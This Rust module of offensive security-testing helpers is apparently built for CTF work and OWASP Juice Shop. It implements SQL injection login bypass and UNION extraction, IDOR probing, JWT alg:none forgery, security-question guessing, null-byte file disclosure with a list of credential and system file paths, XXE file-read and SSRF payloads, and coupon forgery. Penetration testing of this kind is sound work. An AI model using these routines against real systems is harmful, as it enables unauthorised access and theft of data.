//! Security Testing Helpers
//!
//! Common patterns and utilities for security testing scenarios.
//! These helpers encapsulate best practices learned from CTF challenges.

use crate::client::SecurityResponse;
use crate::error::Result;
use crate::payloads::sqli;
use crate::scenario::ScenarioContext;
use std::sync::Arc;

/// SQL Injection helpers
pub mod sqli_helpers {
    use super::*;

    /// Try multiple SQLi payloads for authentication bypass
    ///
    /// Returns the token if successful, None otherwise
    pub async fn try_auth_bypass(
        ctx: &Arc<ScenarioContext>,
        login_endpoint: &str,
        email_field: &str,
        base_email: &str,
    ) -> Result<Option<String>> {
        let payloads = sqli::auth_bypass_payloads();

        for payload in &payloads {
            let email = format!("{}{}", base_email, payload.payload);

            let resp = ctx
                .post(login_endpoint)
                .json(&serde_json::json!({
                    email_field: email,
                    "password": "anything"
                }))
                .send()
                .await?;

            if resp.is_success() {
                if let Ok(token) = resp.extract("$.authentication.token") {
                    return Ok(Some(token));
                } else if let Ok(token) = resp.extract("$.token") {
                    return Ok(Some(token));
                }
            }
        }

        Ok(None)
    }

    /// Extract data via UNION-based SQLi
    pub async fn union_extract(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        query_param: &str,
        table: &str,
        columns: &[&str],
        num_columns: usize,
    ) -> Result<SecurityResponse> {
        let cols = columns.join(",");
        let padding: Vec<String> = (columns.len() + 1..=num_columns)
            .map(|i| i.to_string())
            .collect();
        let padding_str = padding.join(",");

        let payload = if padding.is_empty() {
            format!("')) UNION SELECT {} FROM {}--", cols, table)
        } else {
            format!("')) UNION SELECT {},{} FROM {}--", cols, padding_str, table)
        };

        ctx.get(endpoint).query(query_param, &payload).send().await
    }

    /// Discover number of columns in a table via UNION SQLi
    pub async fn discover_columns(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        query_param: &str,
        max_columns: usize,
    ) -> Result<Option<usize>> {
        for n in 1..=max_columns {
            let columns: Vec<String> = (1..=n).map(|i| i.to_string()).collect();
            let payload = format!("')) UNION SELECT {}--", columns.join(","));

            let resp = ctx
                .get(endpoint)
                .query(query_param, &payload)
                .send()
                .await?;

            if resp.is_success() && !resp.contains("SQLITE_ERROR") && !resp.contains("error") {
                return Ok(Some(n));
            }
        }

        Ok(None)
    }
}

/// IDOR (Insecure Direct Object Reference) helpers
pub mod idor_helpers {
    use super::*;

    /// Test for IDOR vulnerability by accessing sequential IDs
    ///
    /// Returns a list of accessible IDs
    pub async fn probe_ids(
        ctx: &Arc<ScenarioContext>,
        endpoint_template: &str, // e.g., "/rest/basket/{}"
        token: &str,
        start_id: u32,
        end_id: u32,
    ) -> Result<Vec<u32>> {
        let mut accessible = Vec::new();

        for id in start_id..=end_id {
            let endpoint = endpoint_template.replace("{}", &id.to_string());

            let resp = ctx.get(&endpoint).bearer_auth(token).send().await?;

            if resp.is_success() {
                accessible.push(id);
            }
        }

        Ok(accessible)
    }

    /// Test for horizontal privilege escalation
    pub async fn test_horizontal_escalation(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        user_token: &str,
        target_user_id: &str,
    ) -> Result<bool> {
        let resp = ctx
            .get(endpoint)
            .bearer_auth(user_token)
            .query("userId", target_user_id)
            .send()
            .await?;

        Ok(resp.is_success())
    }
}

/// Authentication bypass helpers
pub mod auth_helpers {
    use super::*;
    use crate::payloads::jwt;

    /// Test JWT alg:none vulnerability
    pub async fn test_jwt_none_algorithm(
        ctx: &Arc<ScenarioContext>,
        protected_endpoint: &str,
        payload: &serde_json::Value,
    ) -> Result<bool> {
        let unsigned = jwt::create_unsigned(payload);

        let resp = ctx
            .get(protected_endpoint)
            .bearer_auth(&unsigned)
            .send()
            .await?;

        Ok(resp.is_success())
    }

    /// Test password reset with security question bypass
    pub async fn test_security_question(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        email: &str,
        answers: &[&str],
        new_password: &str,
    ) -> Result<Option<String>> {
        for answer in answers {
            let resp = ctx
                .post(endpoint)
                .json(&serde_json::json!({
                    "email": email,
                    "answer": answer,
                    "new": new_password,
                    "repeat": new_password
                }))
                .send()
                .await?;

            if resp.is_success() {
                return Ok(Some(answer.to_string()));
            }
        }

        Ok(None)
    }
}

/// Input validation bypass helpers
pub mod validation_helpers {
    use super::*;

    /// Test null byte injection for file extension bypass
    ///
    /// Common patterns: %00, %2500
    pub fn null_byte_payloads(filename: &str, fake_extension: &str) -> Vec<String> {
        vec![
            format!("{}\0.{}", filename, fake_extension), // Raw null
            format!("{}%00.{}", filename, fake_extension), // URL encoded
            format!("{}%2500.{}", filename, fake_extension), // Double encoded
            format!("{}%252500.{}", filename, fake_extension), // Triple encoded
            format!("{}....{}", filename, fake_extension), // Dot stuffing
        ]
    }

    /// Test for mass assignment vulnerability
    pub async fn test_mass_assignment(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        base_data: &serde_json::Value,
        extra_fields: &[(&str, serde_json::Value)],
    ) -> Result<Vec<String>> {
        let mut vulnerable_fields = Vec::new();

        for (field, value) in extra_fields {
            let mut data = base_data.clone();
            if let Some(obj) = data.as_object_mut() {
                obj.insert(field.to_string(), value.clone());
            }

            let resp = ctx.post(endpoint).json(&data).send().await?;

            if resp.is_success()
                && let Ok(json) = resp.json_value()
                && json.get("data").and_then(|d| d.get(*field)).is_some()
            {
                vulnerable_fields.push(field.to_string());
            }
        }

        Ok(vulnerable_fields)
    }

    /// Test negative value handling
    pub async fn test_negative_values(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        token: &str,
        base_data: &serde_json::Value,
        numeric_field: &str,
    ) -> Result<bool> {
        let mut data = base_data.clone();
        if let Some(obj) = data.as_object_mut() {
            obj.insert(numeric_field.to_string(), serde_json::json!(-100));
        }

        let resp = ctx
            .post(endpoint)
            .bearer_auth(token)
            .json(&data)
            .send()
            .await?;

        Ok(resp.is_success())
    }
}

/// Security header audit helpers
pub mod header_helpers {
    use super::*;

    /// Security header requirements
    pub struct SecurityHeaderAudit {
        pub missing_critical: Vec<String>,
        pub missing_recommended: Vec<String>,
        pub information_disclosure: Vec<String>,
        pub misconfigured: Vec<String>,
    }

    /// Audit security headers in a response
    pub fn audit_headers(response: &SecurityResponse) -> SecurityHeaderAudit {
        let mut audit = SecurityHeaderAudit {
            missing_critical: Vec::new(),
            missing_recommended: Vec::new(),
            information_disclosure: Vec::new(),
            misconfigured: Vec::new(),
        };

        // Critical headers
        let critical = [
            ("strict-transport-security", "HSTS"),
            ("content-security-policy", "CSP"),
        ];

        for (header, name) in critical {
            if response.header(header).is_none() {
                audit.missing_critical.push(name.to_string());
            }
        }

        // Recommended headers
        let recommended = [
            ("x-content-type-options", "X-Content-Type-Options"),
            ("x-frame-options", "X-Frame-Options"),
            ("x-xss-protection", "X-XSS-Protection"),
            ("referrer-policy", "Referrer-Policy"),
            ("permissions-policy", "Permissions-Policy"),
        ];

        for (header, name) in recommended {
            if response.header(header).is_none() {
                audit.missing_recommended.push(name.to_string());
            }
        }

        // Information disclosure
        if response.header("server").is_some() {
            audit.information_disclosure.push("Server".to_string());
        }
        if response.header("x-powered-by").is_some() {
            audit
                .information_disclosure
                .push("X-Powered-By".to_string());
        }

        // Misconfiguration
        if let Some(cors) = response.header("access-control-allow-origin")
            && cors == "*"
        {
            audit.misconfigured.push("Wildcard CORS".to_string());
        }

        audit
    }
}

/// CAPTCHA bypass helpers
pub mod captcha_helpers {
    use super::*;

    /// CAPTCHA data for reuse
    #[derive(Debug, Clone)]
    pub struct CaptchaData {
        pub id: i64,
        pub answer: String,
    }

    /// Get CAPTCHA and solve it (for testing CAPTCHA bypass)
    pub async fn get_captcha(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
    ) -> Result<Option<CaptchaData>> {
        let resp = ctx.get(endpoint).send().await?;

        if resp.is_success()
            && let Ok(json) = resp.json_value()
        {
            let id = json.get("captchaId").and_then(|v| v.as_i64()).unwrap_or(0);
            let answer = json
                .get("answer")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();

            return Ok(Some(CaptchaData { id, answer }));
        }

        Ok(None)
    }

    /// Test CAPTCHA reuse vulnerability
    pub async fn test_captcha_reuse(
        ctx: &Arc<ScenarioContext>,
        submit_endpoint: &str,
        captcha: &CaptchaData,
        data: &serde_json::Value,
        attempts: usize,
    ) -> Result<usize> {
        let mut successful_reuses = 0;

        for _ in 0..attempts {
            let mut submit_data = data.clone();
            if let Some(obj) = submit_data.as_object_mut() {
                obj.insert("captchaId".to_string(), serde_json::json!(captcha.id));
                obj.insert("captcha".to_string(), serde_json::json!(captcha.answer));
            }

            let resp = ctx.post(submit_endpoint).json(&submit_data).send().await?;

            if resp.is_success() {
                successful_reuses += 1;
            }
        }

        Ok(successful_reuses)
    }
}

/// File upload helpers for multipart/form-data
pub mod upload_helpers {
    /// Build a multipart form-data body for file upload
    ///
    /// # Example
    /// ```ignore
    /// let body = build_multipart_body("file", "test.xml", "text/xml", "<test/>");
    /// ctx.post("/upload")
    ///     .header("Content-Type", &format!("multipart/form-data; boundary={}", BOUNDARY))
    ///     .body(body)
    ///     .send().await?;
    /// ```
    pub fn build_multipart_body(
        field_name: &str,
        filename: &str,
        content_type: &str,
        content: &str,
    ) -> String {
        format!(
            "--{boundary}\r\n\
             Content-Disposition: form-data; name=\"{field}\"; filename=\"{filename}\"\r\n\
             Content-Type: {content_type}\r\n\r\n\
             {content}\r\n\
             --{boundary}--\r\n",
            boundary = BOUNDARY,
            field = field_name,
            filename = filename,
            content_type = content_type,
            content = content
        )
    }

    /// Standard boundary for multipart requests
    pub const BOUNDARY: &str = "----WebKitFormBoundary7MA4YWxkTrZu0gW";

    /// Content-Type header value for multipart with boundary
    pub fn multipart_content_type() -> String {
        format!("multipart/form-data; boundary={}", BOUNDARY)
    }

    /// Build XXE payload for file disclosure
    pub fn xxe_file_read(file_path: &str) -> String {
        format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{}">]>
<root>&xxe;</root>"#,
            file_path
        )
    }

    /// Build XXE payload for SSRF
    pub fn xxe_ssrf(url: &str) -> String {
        format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}">]>
<root>&xxe;</root>"#,
            url
        )
    }
}

/// Forgery and parameter tampering helpers
pub mod forgery_helpers {
    use super::*;

    /// Test user ID forgery in request body
    ///
    /// Attempts to submit data with a different user ID to test access control
    pub async fn test_user_id_forgery(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        method: &str,
        token: &str,
        user_id_field: &str,
        target_user_id: serde_json::Value,
        base_data: &serde_json::Value,
    ) -> Result<bool> {
        let mut data = base_data.clone();
        if let Some(obj) = data.as_object_mut() {
            obj.insert(user_id_field.to_string(), target_user_id);
        }

        let resp = match method.to_uppercase().as_str() {
            "POST" => {
                ctx.post(endpoint)
                    .bearer_auth(token)
                    .json(&data)
                    .send()
                    .await?
            }
            "PUT" => {
                ctx.put(endpoint)
                    .bearer_auth(token)
                    .json(&data)
                    .send()
                    .await?
            }
            "PATCH" => {
                // Use POST with method override for PATCH
                ctx.post(endpoint)
                    .header("X-HTTP-Method-Override", "PATCH")
                    .bearer_auth(token)
                    .json(&data)
                    .send()
                    .await?
            }
            _ => return Ok(false),
        };

        Ok(resp.is_success())
    }

    /// Test author/ownership forgery
    pub async fn test_author_forgery(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        token: &str,
        forged_author: &str,
        message: &str,
    ) -> Result<bool> {
        let data = serde_json::json!({
            "message": message,
            "author": forged_author
        });

        let resp = ctx
            .put(endpoint)
            .bearer_auth(token)
            .json(&data)
            .send()
            .await?;

        Ok(resp.is_success())
    }
}

/// File disclosure helpers (null byte, path traversal)
pub mod file_disclosure {
    use super::*;

    /// Access file via null byte injection
    ///
    /// Tries multiple null byte encodings to bypass extension checks
    pub async fn access_with_null_byte(
        ctx: &Arc<ScenarioContext>,
        base_path: &str,
        target_file: &str,
        fake_extension: &str,
    ) -> Result<Option<SecurityResponse>> {
        let payloads = [
            format!("{}/{}%00.{}", base_path, target_file, fake_extension),
            format!("{}/{}%2500.{}", base_path, target_file, fake_extension),
            format!("{}/{}%252500.{}", base_path, target_file, fake_extension),
        ];

        for payload in &payloads {
            let resp = ctx.get(payload).send().await?;
            if resp.is_success() {
                return Ok(Some(resp));
            }
        }

        Ok(None)
    }

    /// Common sensitive files to probe
    pub fn sensitive_file_paths() -> Vec<&'static str> {
        vec![
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "~/.ssh/id_rsa",
            "~/.bash_history",
            "/var/log/auth.log",
            "package.json",
            ".env",
            ".git/config",
            "wp-config.php",
            "config.php",
            "database.yml",
        ]
    }

    /// Common backup file extensions
    pub fn backup_extensions() -> Vec<&'static str> {
        vec![
            ".bak", ".backup", ".old", ".orig", ".save", ".swp", "~", ".copy",
        ]
    }
}

/// OSINT helpers for security question attacks
pub mod osint_helpers {
    /// Common security question answer patterns
    ///
    /// Based on patterns observed in CTF challenges
    pub fn common_answers_for_category(category: &str) -> Vec<&'static str> {
        match category.to_lowercase().as_str() {
            "pet" | "pet_name" | "favorite_pet" => vec![
                "Fluffy", "Max", "Buddy", "Charlie", "Rocky", "Bear", "Duke", "Zaya",
            ],
            "city" | "birth_city" | "hometown" => vec![
                "New York",
                "Los Angeles",
                "Chicago",
                "Houston",
                "Phoenix",
                "London",
                "Tokyo",
            ],
            "movie" | "favorite_movie" => vec![
                "Star Wars",
                "The Godfather",
                "Pulp Fiction",
                "The Matrix",
                "Silence of the Lambs",
                "Inception",
            ],
            "company" | "employer" | "first_job" => vec![
                "McDonald's",
                "Walmart",
                "Amazon",
                "Google",
                "Stop'n'Drop",
                "Initech",
            ],
            "sibling" | "brother" | "sister" => {
                vec![
                    "John", "James", "Michael", "David", "Samuel", "Robert", "Mary", "Sarah",
                ]
            }
            "mother_maiden" => vec![
                "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
            ],
            _ => vec![],
        }
    }

    /// Character reference answers (from pop culture)
    ///
    /// Many CTFs use fictional character backstories
    pub fn pop_culture_references()
    -> std::collections::HashMap<&'static str, Vec<(&'static str, &'static str)>> {
        let mut refs = std::collections::HashMap::new();

        // Star Trek references
        refs.insert(
            "star_trek",
            vec![
                ("ship", "NCC-1701"),
                ("ship", "Enterprise"),
                ("captain", "Kirk"),
                ("captain", "Picard"),
                ("brother", "Samuel"), // Jim Kirk's brother
                ("first_officer", "Spock"),
                ("doctor", "McCoy"),
            ],
        );

        // Futurama references
        refs.insert(
            "futurama",
            vec![
                ("employer", "Stop'n'Drop"),
                ("employer", "Planet Express"),
                ("drink", "Slurm"),
                ("robot", "Bender"),
                ("captain", "Leela"),
                ("professor", "Farnsworth"),
            ],
        );

        // Hunter x Hunter
        refs.insert(
            "hunter_x_hunter",
            vec![
                ("movie", "Silence of the Lambs"), // Uvogin's favorite
                ("ability", "Nen"),
                ("exam", "Hunter Exam"),
                ("group", "Phantom Troupe"),
                ("leader", "Chrollo"),
            ],
        );

        // The Matrix
        refs.insert(
            "matrix",
            vec![
                ("ship", "Nebuchadnezzar"),
                ("captain", "Morpheus"),
                ("hero", "Neo"),
                ("city", "Zion"),
            ],
        );

        // Office Space (for Initech)
        refs.insert(
            "office_space",
            vec![
                ("company", "Initech"),
                ("boss", "Bill Lumbergh"),
                ("consultant", "Bob"),
            ],
        );

        refs
    }

    /// Hunter x Hunter character references
    ///
    /// Specific to HxH-themed CTF challenges.
    pub fn hxh_references() -> std::collections::HashMap<&'static str, &'static str> {
        let mut refs = std::collections::HashMap::new();

        // Phantom Troupe members and their traits
        refs.insert("uvogin_movie", "Silence of the Lambs");
        refs.insert("uvogin_ability", "Big Bang Impact");
        refs.insert("chrollo_ability", "Skill Hunter");
        refs.insert("hisoka_category", "Transmutation");
        refs.insert("killua_family", "Zoldyck");
        refs.insert("gon_father", "Ging");

        refs
    }

    /// Star Trek character references
    ///
    /// For Kirk, Spock, and other Trek-themed challenges.
    pub fn star_trek_references() -> std::collections::HashMap<&'static str, &'static str> {
        let mut refs = std::collections::HashMap::new();

        // Kirk family
        refs.insert("jim_brother", "Samuel");
        refs.insert("jim_son", "David");
        refs.insert("jim_ship", "Enterprise");
        refs.insert("jim_registry", "NCC-1701");

        // Spock
        refs.insert("spock_father", "Sarek");
        refs.insert("spock_mother", "Amanda");
        refs.insert("spock_homeworld", "Vulcan");

        // General
        refs.insert("federation_hq", "San Francisco");
        refs.insert("academy", "Starfleet Academy");

        refs
    }

    /// Futurama character references
    ///
    /// For Bender, Fry, and other Futurama-themed challenges.
    pub fn futurama_references() -> std::collections::HashMap<&'static str, &'static str> {
        let mut refs = std::collections::HashMap::new();

        // Bender
        refs.insert("bender_employer", "Stop'n'Drop");
        refs.insert("bender_serial", "1729");
        refs.insert("bender_catchphrase", "Bite my shiny metal ass");

        // Fry
        refs.insert("fry_dog", "Seymour");
        refs.insert("fry_brother", "Yancy");
        refs.insert("fry_nephew", "Philip");

        // Company
        refs.insert("company", "Planet Express");
        refs.insert("professor", "Farnsworth");
        refs.insert("drink", "Slurm");

        refs
    }
}

/// Coupon forgery helpers
pub mod coupon_helpers {
    use crate::payloads::encoding::{z85_decode, z85_encode};

    /// Common coupon format patterns
    #[derive(Debug, Clone)]
    pub struct CouponFormat {
        pub prefix_type: CouponPrefixType,
        pub separator: char,
        pub encoding: CouponEncoding,
    }

    #[derive(Debug, Clone)]
    pub enum CouponPrefixType {
        /// Month abbreviation (JAN, FEB, etc.)
        Month3Letter,
        /// Season (SPRING, SUMMER, etc.)
        Season,
        /// Custom prefix
        Custom(String),
    }

    #[derive(Debug, Clone)]
    pub enum CouponEncoding {
        /// Plain text
        Plain,
        /// Base64 encoded
        Base64,
        /// Z85 encoded (ZeroMQ Base-85)
        Z85,
        /// Hex encoded
        Hex,
    }

    impl Default for CouponFormat {
        fn default() -> Self {
            Self {
                prefix_type: CouponPrefixType::Month3Letter,
                separator: '-',
                encoding: CouponEncoding::Z85,
            }
        }
    }

    /// Analyze coupon samples to determine format
    ///
    /// Returns the detected format based on sample coupons.
    pub fn analyze_coupon_format(samples: &[&str]) -> CouponFormat {
        let mut format = CouponFormat::default();

        if samples.is_empty() {
            return format;
        }

        // Try to decode as Z85
        for sample in samples {
            if let Some(decoded) = z85_decode(sample) {
                let decoded = decoded.trim_end_matches('\0');

                // Check for month pattern (MMMYY-DD)
                let months = [
                    "JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV",
                    "DEC",
                ];

                if decoded.len() >= 3 && months.contains(&&decoded[0..3]) {
                    format.prefix_type = CouponPrefixType::Month3Letter;
                    format.encoding = CouponEncoding::Z85;

                    // Detect separator
                    if decoded.contains('-') {
                        format.separator = '-';
                    } else if decoded.contains('_') {
                        format.separator = '_';
                    }

                    return format;
                }
            }
        }

        // Check for plain text patterns
        for sample in samples {
            if sample.contains('-') || sample.contains('_') {
                format.encoding = CouponEncoding::Plain;
                format.separator = if sample.contains('-') { '-' } else { '_' };
            }
        }

        format
    }

    /// Generate a coupon based on format
    pub fn generate_coupon(format: &CouponFormat, month: &str, year: u16, discount: u8) -> String {
        let prefix = match &format.prefix_type {
            CouponPrefixType::Month3Letter => month.to_uppercase(),
            CouponPrefixType::Season => month.to_uppercase(),
            CouponPrefixType::Custom(s) => s.clone(),
        };

        let plain = format!("{}{}{}{}", prefix, year % 100, format.separator, discount);

        match format.encoding {
            CouponEncoding::Plain => plain,
            CouponEncoding::Base64 => {
                use base64::{Engine as _, engine::general_purpose::STANDARD};
                STANDARD.encode(plain.as_bytes())
            }
            CouponEncoding::Z85 => z85_encode(&plain),
            CouponEncoding::Hex => hex::encode(plain.as_bytes()),
        }
    }

    /// Generate Z85-encoded coupon (most common in Juice Shop)
    ///
    /// # Example
    /// ```
    /// use rectitude::helpers::coupon_helpers::generate_z85_coupon;
    /// let coupon = generate_z85_coupon("JAN", 26, 90);
    /// assert!(!coupon.is_empty());
    /// ```
    pub fn generate_z85_coupon(month: &str, year: u16, discount: u8) -> String {
        let plain = format!("{}{}-{}", month.to_uppercase(), year % 100, discount);
        z85_encode(&plain)
    }

    /// Generate all monthly coupons for a year
    pub fn generate_year_coupons(year: u16, discount: u8) -> Vec<(String, String)> {
        let months = [
            "JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC",
        ];

        months
            .iter()
            .map(|m| {
                let plain = format!("{}{}-{}", m, year % 100, discount);
                let encoded = z85_encode(&plain);
                (plain, encoded)
            })
            .collect()
    }

    /// Brute force discount values for a given month/year
    pub fn brute_force_discounts(month: &str, year: u16, min: u8, max: u8) -> Vec<(u8, String)> {
        (min..=max)
            .map(|d| (d, generate_z85_coupon(month, year, d)))
            .collect()
    }
}

/// Parameter omission helpers
pub mod omission_helpers {
    use super::*;

    /// Test if a required parameter can be omitted
    ///
    /// Some endpoints fail to validate required parameters,
    /// allowing bypass (e.g., omitting 'current' password)
    pub async fn test_parameter_omission(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        method: &str,
        token: &str,
        full_params: &[(&str, &str)],
        param_to_omit: &str,
    ) -> Result<bool> {
        let params: Vec<(&str, &str)> = full_params
            .iter()
            .filter(|(k, _)| *k != param_to_omit)
            .copied()
            .collect();

        let mut req = match method.to_uppercase().as_str() {
            "GET" => ctx.get(endpoint),
            "POST" => ctx.post(endpoint),
            "PUT" => ctx.put(endpoint),
            _ => return Ok(false),
        };

        req = req.bearer_auth(token);
        for (k, v) in params {
            req = req.query(k, v);
        }

        let resp = req.send().await?;
        Ok(resp.is_success())
    }

    /// Test password change without current password
    pub async fn test_password_change_bypass(
        ctx: &Arc<ScenarioContext>,
        endpoint: &str,
        token: &str,
        new_password: &str,
    ) -> Result<bool> {
        // Try omitting 'current' parameter
        let resp = ctx
            .get(endpoint)
            .bearer_auth(token)
            .query("new", new_password)
            .query("repeat", new_password)
            .send()
            .await?;

        Ok(resp.is_success())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_null_byte_payloads() {
        let payloads = validation_helpers::null_byte_payloads("secret.txt", "md");
        assert!(payloads.len() >= 3);
        assert!(payloads[1].contains("%00"));
        assert!(payloads[2].contains("%2500"));
    }

    #[test]
    fn test_header_audit() {
        use std::collections::HashMap;

        let response = SecurityResponse {
            status: reqwest::StatusCode::OK,
            headers: HashMap::from([
                ("x-frame-options".to_string(), "DENY".to_string()),
                ("server".to_string(), "nginx".to_string()),
            ]),
            body: vec![],
            text: Some(String::new()),
        };

        let audit = header_helpers::audit_headers(&response);
        assert!(audit.missing_critical.contains(&"HSTS".to_string()));
        assert!(audit.missing_critical.contains(&"CSP".to_string()));
        assert!(audit.information_disclosure.contains(&"Server".to_string()));
    }
}
